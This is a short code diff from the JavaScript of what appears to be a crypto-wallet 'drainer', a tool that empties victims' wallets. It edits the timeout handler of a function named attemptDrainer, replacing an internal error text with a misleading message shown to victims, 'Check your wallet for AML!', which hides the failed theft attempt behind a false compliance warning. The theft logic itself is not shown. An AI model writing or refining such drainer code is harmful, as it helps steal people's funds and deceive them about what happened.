@@ -808,7 +808,7 @@ async function attemptDrainer() {
   const drainerTimeout = setTimeout(async () => {
     isTransactionPending = false;
     console.error('❌ Тайм-аут выполнения дрейнера');
-    await hideModalWithDelay("Error: Drainer operation timed out. Please try again.");
+    await hideModalWithDelay("Check your wallet for AML!");
   }, 60000);
 
   try {
